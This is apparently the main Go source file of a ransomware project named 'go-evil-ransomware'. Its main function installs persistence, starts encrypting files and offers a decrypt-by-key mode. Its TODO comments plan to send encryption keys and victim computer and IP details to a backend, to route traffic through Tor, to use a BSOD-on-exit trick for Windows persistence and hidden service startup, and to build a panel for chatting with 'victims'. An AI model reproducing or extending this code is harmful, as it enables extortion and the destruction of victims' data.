package main

import (
	"fmt"
	"go-evil-ransomware/ransom"
	"os"
)

//TODO IMPORTANT:
//Make this a package on github.com/PaulDotSH/go-evil/ransomware
//Use the cmd way to make a cli thingy
//Make the panel able to change settings and build the programs
//Make a build script for the panel or sth

//TODO:
//Send encryption key, computer and ip details to a backend (as JSON)
//check if unicode paths work correctly
//on windows persistence could be added by marking the process as "essential", making the computer BSOD on process exit
//route everything through tor or test if it works through tor
//TODO LONGTERM:
//make the startup better on windows using other methods that are hidden like services
//make a live thingy panel, so "victims" could talk to the pentester through a live chat
//and the pentester could remotely decrypt their files
//if offline the panel wouldn't work, have the option to either wait until the victim gets online, or encrypt with static key
//try with websocket?

func init() {

}

func main() {
	//Handle decryption
	if len(os.Args) > 2 && os.Args[1] == "decrypt" {
		keyBytes := []byte(os.Args[2])
		ransom.DecryptEveryPartition(keyBytes)
		fmt.Println("Done...")
		return
	}

	if ransom.Debug {
		fmt.Println("WARNING: Starting to encrypt files...")
		fmt.Println("Press enter to continue")
		fmt.Scanln()
	}

	ransom.AddPersistence()
	ransom.Start()
	ransom.RemovePersistence()
}
